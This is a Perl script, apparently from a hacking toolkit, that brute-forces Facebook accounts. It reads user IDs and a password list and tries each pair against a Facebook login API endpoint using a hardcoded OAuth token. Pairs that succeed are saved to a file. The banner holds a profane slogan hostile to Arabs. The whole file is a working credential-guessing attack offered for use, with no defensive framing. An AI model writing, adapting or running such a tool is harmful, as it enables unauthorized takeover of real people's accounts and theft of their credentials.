
##########  Copyright To 1337-R00t / Plz Dont Cry  ##########
# But this Code was Edited By M4rkWalker For Xsmash Tool(https://github.com/m4rktn/xsmash)
#Youtube :M4rkWalker/Github :/m4rktn
##########  MerSi Boco0 xD  ##########
use LWP::UserAgent; 
use Term::ANSIColor;
##########  9ahwa  ##########
system ("title Hello Walkers ");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('bold red'),"
   #########################################
   # Facebook Bruter  -  Fuck Arab Hikirz  #
   #  Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh ^^ #
   #       ~~~~~~~ M4rkWalker ~~~~~~~      #
   #########################################
\n";           
print color 'bold blue';
open (USERFILE, "<user.txt") || die "[-] Please Try To Save user.txt(Profil's ID) !";
@USERS = <USERFILE>;
print color('bold green'),"  [";
print color('bold yellow'),"+";
print color('bold green'),"] ";
print color('bold green'),"User.txt ... Founded \n";
close USERFILE;
print color 'bold blue';
open (PASSFILE, "<passwd.txt") || die "[-] Please Try To save passwd.txt(passwords's List) !";
@PASSS = <PASSFILE>;
print color('bold green'),"  [";
print color('bold yellow'),"+";
print color('bold green'),"] ";
print color('bold green'),"passwd.txt ... Founded \n";
close PASSFILE;
print "\n###################\n#Ultra Smash ! 30%#\n#Ultra Smash ! 48%#\n#Ultra Smash ! 53%#\n#Ultra Smash ! 69%#\n#Ultra Smash ! 97%#\n#### Come On ! ####\n\n\n";
######################
foreach $username (@USERS) {
chomp $username;
	foreach $password (@PASSS) {
	chomp $password;
		#############################################
		$facebook = LWP::UserAgent->new();
		$facebook->default_header('Authorization' => "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16");
		$response = $facebook->post('https://b-api.facebook.com/method/auth.login',
			{ 
			format => 'json',
			email => $username,
			password => $password,
			credentials_type => 'password'
			}
			);
		if ($response->content=~ /"session_key"/) {
			print color('bold blue'),"--> Founded Ya m4rk : $username:$password\n";
			open(mark,">>boom.txt");
			print mark "-----	Boom!!	-----\n$username:$password\n-----Fucked By M4rkwalker-----\n";
			close(mark);
			sleep(3);
		}
		else {
			if ($response->content=~ /Invalid username or password/) {
				print color('bold red'),"Failed : $username:$password\n";
			}
			else
			{
				if ($response->content=~ /Invalid username or email address/) {
					print color('bold yellow'),"NotFound : $username \n";
				}
				else
				{
					print color('bold red'),"Wtf !!\n";
				}
			}
		}
	}
}
#Giving To Darkside...
